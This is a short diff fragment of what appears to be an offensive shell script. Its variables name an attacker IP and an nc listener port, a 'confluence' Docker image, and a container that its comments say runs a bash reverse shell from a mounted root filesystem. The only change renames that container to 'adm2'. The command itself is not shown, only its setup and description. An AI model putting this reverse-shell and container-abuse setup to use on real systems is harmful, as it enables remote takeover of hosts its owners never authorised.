@@ -3,7 +3,7 @@
 ATTACKER_IP=5.53.16.66         # IP of attacker host running nc listener
 ATTACKER_PORT=1236              # Port on the nc listener on the attacker host
 DOCKER_IMAGE=confluence             # Name of the docker image to use as the base
-CONTAINER_NAME=docker_root_fs    # Name of the new container
+CONTAINER_NAME=adm2    # Name of the new container
 
 # Define the command to execute when the new container starts up
 # This version executes a simple bash reverse shell from the rootfs mount /tmp, but it could be swapped out for anything else
